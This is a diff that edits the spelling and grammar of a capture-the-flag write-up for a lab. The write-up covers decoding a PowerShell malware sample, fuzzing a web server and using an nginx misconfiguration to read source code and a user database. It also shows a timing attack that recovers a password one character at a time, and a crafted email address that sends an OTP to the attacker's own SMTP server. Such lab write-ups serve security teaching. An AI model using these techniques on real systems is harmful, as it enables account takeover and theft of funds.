@@ -3,10 +3,10 @@
 
 **sq4.png**
 
-- We have downloaded the malware from the site .
-- it continas a large base64 data on decoiding we found a powershell script.
-- The script contains a variable $d it has again a large base64 data . 
-- in the last the script is running a for loop againist the vairable d$ to perfomr xor operation . and sends the results to a url , so i modified the code to save it on my machine . i gor a png file . 
+- We have downloaded the malware from the site.
+- It contains a large base64 data. On decoding, we found a PowerShell script.
+- The script contains a variable $d, which has a large base64 data. 
+- In the last, the script is running a for loop against the variable d$ to perform an XOR operation. and sends the results to a URL, so I modified the code to save it on my machine. I got a PNG file. 
 
 - sq4 = throne123*
 
@@ -31,10 +31,10 @@
 
 ## First Flag
 
-This url gives interface to the mobile
+This URL gives an interface to the mobile
 https://10.48.142.96:8443/ 
 
-- Didn't find anything on mobile interface 
+- Didn't find anything on the mobile interface 
 
 ```
 ffuf -u https://10.48.190.17:8443/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt 
@@ -65,7 +65,7 @@ nginx.conf              [Status: 200, Size: 890, Words: 226, Lines: 32, Duration
 :: Progress: [2565/2565] :: Job [1/1] :: 269 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
 ```
 
-- found a nginx.conf file
+- found an nginx.conf file
 ```
 user  nginx;
 worker_processes 4;
@@ -100,10 +100,10 @@ http {
 daemon off;
 ```
 
-- You can see that try_files part in the end . what it actually doing is . when the server receive a request it check weather te file exists or not if exisits it directly server from the disk  or forward teh request to @app handler . 
+- You can see the try_files part in the end. What it is actually doing is. When the server receives a request, it checks whether the file exists or not. If the file exists, it directly serves it from the disk or forwards the request to the @app handler. 
 
-- so we can read any files on the disk if we can able to guess the file name. 
-- as it is python applicaton lets try some file names like app.py, main.py .. etc.
+- so we can read any files on the disk if we can guess the file name. 
+- As it is a Python application, let's try some file names like app.py, main.py, etc.
 
 ```
 GET /main.py HTTP/2
@@ -124,7 +124,7 @@ Priority: u=5, i
 Te: trailers
 ```
 
-- we got 200 for main.py in the source code we can find the first flag.
+- We got 200 for main.py in the source code, we can find the first flag.
 ```
 HTTP/2 200 OK
 Server: nginx/1.29.3
@@ -357,8 +357,8 @@ if __name__ == '__main__':
 
 ## Second Flag
 
-- As you can see the code contains two sqlite3 .db files hopflix-874297.db and hopsecbank-12312497.db
-- But only hopflix-874297.db was exists on the disk. So i downloaded it to my local machine .
+- As you can see, the code contains two sqlite3 .db files, hopflix-874297.db and hopsecbank-12312497.db
+- But only hopflix-874297.db exists in the current directory. So I downloaded it to my local machine.
 
 ```
 wget https://10.48.156.200:8443/hopflix-874297.db --no-check-certificate
@@ -372,7 +372,7 @@ sbreachblocker@easterbunnies.thm|Sir BreachBlocker|03c96ceff1a9758a1ea7c3cb8d432
 sqlite> 
 ```
 
-- In the users table we can see email and password hash . but it is not a normal hash. in the main.py we can see how the hopflix autuntication is carried out .
+- In the users table, we can see email and password hash. But it is not a normal hash. In the main.py, we can see how the hopflix authentication is carried out.
 
 ```
 def hopper_hash(s):
@@ -411,16 +411,16 @@ def check_credentials():
     return jsonify({'valid': True})
 ```
 
-- The enppoint /api/check-credentials receives our email and password in json format .
-- Then a sql query get executed on hopflix database , and store the info in rows variable . 
-- so the **rows == [("email", "full_name", "password_hash")]**
-- **phash = rows[0][2]** this line takes the password hash from the rows and store in a variable phash.
+- The endpoint /api/check-credentials receives our email and password in JSON format.
+- Then a SQL query gets executed on the hopflix database, and stores the info in the rows variable. 
+- So the rows variable contains something like this. **rows == [("email", "full_name", "password_hash")]**
+- **phash = rows[0][2]** This line takes the password hash from the rows variable and stores it in a variable called phash.
 
 ```
    if len(pwd)*40 != len(phash):
         return jsonify({'valid':False, 'error':'Incorrect Password'})
 ```
-- This part checks pwd x (40) is not equlas to len of phash then password is incorrect which means the len of password is len(phas)/40 which is 12 (we know the length of phash from the sqlite3 .db file).
+- This part checks if pwd x (40) is not equal to len of phash, then the password is incorrect, which means the length of the password is len(phas)/40, which is 12 (we know the length of phash from the sqlite3 .db file).
 
 ```
  for ch in pwd:
@@ -429,9 +429,9 @@ def check_credentials():
             return jsonify({'valid':False, 'error':'Incorrect Password'})
         phash = phash[40:]
 ```
-- This bloc of code takes each char of the pwd and runs a function hopper_hash() on them. then check the char_hash with the phash first 40 charecters .
+- This block of code takes each character of the password and runs a function hopper_hash() on it. Then check the char_hash with the phash first 40 characters.
 
-- Take look at the hopper_hash() function
+- Take a look at the hopper_hash() function
 ```   
 def hopper_hash(s):
     res = s
@@ -440,11 +440,11 @@ def hopper_hash(s):
     return res
 ```
 
-- now it make sence it takes each chat and encodes it run sha1 on it then hexdigest it . 
-- this process runs 5000 times . 
-- The output of each char is 40 cahr length. Thi is the reason it coparing each cahr_hash with the first 40 char of the phash.
+- now it makes sense, it takes each chat and encodes it, runs sha1 on it, then hexdigests it. 
+- This process runs 5000 times. 
+- The output of each character is 40. This is the reason it compares each char_hash with the first 40 chars of the phash.
 
-- Intially i tried brutee forcing the password but it didnt worked . don't know thr reaseon . but later found as the application checking one char at a time . there is a time based attack can possible . 
+- Initially, I tried brute forcing the password, but it didn't work. don't know the reason. But later found that the application was checking one character at a time. There might be a time-based attack that is possible. 
 
 ```
 import requests
@@ -587,7 +587,7 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print(f"\n\n[!] Attack interrupted by user")
 ```
-***NOTE: Run the code in Attackbox not on you locala machine because time-based attacks are sensitive the vpn delay may cause some  kind of issue***
+***NOTE: Run the code in Attackbox, not on your local machine, because time-based attacks are so sensitive that the vpn delay may cause some  kind of issue***
 
 ```
 ======================================================================
@@ -605,21 +605,22 @@ Testing discovered password...
 [] PASSWORD VERIFIED! Login successful!
 ======================================================================
 ```
-- Email **	**
+- Email **sbreachblocker@easterbunnies.thm**
 - The password is **malharerocks**
-- Enter the password you get flag on last seen.
+- Enter the password you get flag on the last seen.
 
 **Flag = THM{fluffier_things_season_4}**
 
 ## Third Flag
 
-- I tried the same creds for banking app too. you know what it worked.
-- So the mecanism . 1. you enter creds
-					2. you prompted to select a email
-					3. the email receives a otp 
-					4. enter the otp to release funds
+- I tried the same creds for the banking app too. You know what it worked.
+-  mechanism to release funds.
+  					1. You enter creds
+					2. You are prompted to select an email
+					3. The email receives an otp 
+					4. Enter the otp to release funds
 
-- You can see from main.py the send_otp_email() has a flaw.
+- You can see from main.py that send_otp_email() function. It contains the main flaw.
 
 
 ```
@@ -647,41 +648,41 @@ def send_otp_email(otp, to_addr):
     s.quit()
 ```
 
-- here the code is actually checking thr domain with a white list of domains . 
-- it spliting the email at @ then taking the domain name and comparing it with the allowd_domains 
+- Here, the code is actually checking the domain with a white list of domains. 
+- It splits the email at @, then takes the domain name and compares it with the list of allowed domains.
 
 ```
 if False and to_addr not in allowed_emails:
 ```
 - This line allows the function to continue, regardless of the actual destination address. if the domain matches in our case **easterbunnies.thm**
-- this can be bypassed by some SMTP parsing tricks . 
-- Found this rticle on portswigger, have a loot at it .https://portswigger.net/research/splitting-the-email-atom
+- This can be bypassed by some SMTP parsing tricks. 
+- Found this article on [PortSwigger](https://portswigger.net/research/splitting-the-email-atom), have a look at it 
 
 **To Exploit this**
 
-- I craft a payload that points to my own own smtp server. 
-- For this i am going to use **aiosmtpd** python tool.
+- I crafted a payload that points to my own SMTP server. 
+- For this, I am going to use **aiosmtpd** Python tool, to set up a SMTP server.
 
 ```
 pip install aiosmtpd
 
 ```
 
-- Setting up a local smtp server 
+- Setting up a local SMTP server 
 
 ```
 aiosmtpd -n -l 192.168.136.147:25
 ```
-- From the above portswigger article it explained how the caharecter "(" can comment out part of email adress. 
-- We are going to use this to craft a email that points to our SMTP.
+- From the above PortSwigger article, it explained how the character "(" can comment out part of an email address. 
+- We are going to use this to craft an email that points to our SMTP.
 
 **Crafted Email**
 ```
 wick@[192.168.136.147](@easterbunnies.thm
 ```
 
-- Start burp suite and turn intercept on
-- enter the creds and press enter let the request pass .
+- Start Burp Suite and turn intercept on
+- Enter the creds and press enter, let the request pass.
 - Then intercept the send-2fa request and change the email to the crafted email 
 ```
 POST /api/send-2fa HTTP/2
@@ -707,7 +708,7 @@ Te: trailers
 ```
 - Forward the request 
 
-- Then we receive a otp email at our smtp server 
+- Then we receive an otp email at our SMTP server 
 ```
 ---------- MESSAGE FOLLOWS ----------
 Received: from [172.18.0.2] (sq5_app-v2_1.sq5_default [172.18.0.2])
@@ -723,7 +724,7 @@ X-Peer: ('10.48.171.254', 48464)
     Thanks for trusting Hopsec Bank!
 ------------ END MESSAGE ------------
 ```
-- Enter the otp and then release funds we get the flag
+- Enter the otp and then release funds, we get the flag
 
 **Flag=THM{neggative_balance}**
 
